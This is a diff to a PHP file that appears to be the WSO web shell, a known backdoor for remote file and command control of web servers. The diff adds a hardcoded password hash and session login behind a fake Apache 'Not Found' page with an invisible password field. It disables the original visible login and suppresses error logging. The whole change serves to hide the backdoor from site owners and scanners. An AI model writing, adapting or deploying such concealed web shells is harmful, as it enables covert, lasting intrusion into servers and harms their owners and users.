@@ -1,4 +1,5 @@
 <?php
+	$Logins = "a727563903d3000164c58f515fb96a52";
 	$color = "#2980b9";
 	$default_action = 'FilesMan';
 	$default_use_ajax = true;
@@ -13,7 +14,7 @@
 		}
 
 	}
-
+	@session_start();
 	@ini_set('error_log',NULL);
 	@ini_set('log_errors',0);
 	@ini_set('max_execution_time',0);
@@ -31,26 +32,48 @@
 		$_POST = WSOstripslashes($_POST);
 		$_COOKIE = WSOstripslashes($_COOKIE);
 	}
-
 	
+	function printLogin() { 
+    ?> 
+<h1>Not Found</h1> 
+<p>The requested URL was not found on this server.</p> 
+<hr> 
+<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
+    <style> 
+        input { margin:0;background-color:#fff;border:1px solid #fff; } 
+    </style> 
+    <center> 
+    <form method=post> 
+    <input type=password name=pass> 
+    </form></center> 
+    <?php 
+    exit; 
+} 
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+	if( empty($Logins) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $Logins) ) )
+		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+	else
+		printLogin();
+
+	/*
 	function wsoLogin() {
 		die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='Go'></form></pre>");
 	}
-
+	*/
 	
 	function WSOsetcookie($k, $v) {
 		$_COOKIE[$k] = $v;
 		setcookie($k, $v);
 	}
 
-	
-	if(!empty($auth_pass)) {
+	/*
+//	if(!empty($auth_pass)) {
 		
 		if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))        WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
 		
 		if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))        wsoLogin();
 	}
-
+	*/
 	
 	if(strtolower(substr(PHP_OS,0,3)) == "win")    $os = 'win'; else    $os = 'nix';
 	$safe_mode = @ini_get('safe_mode');
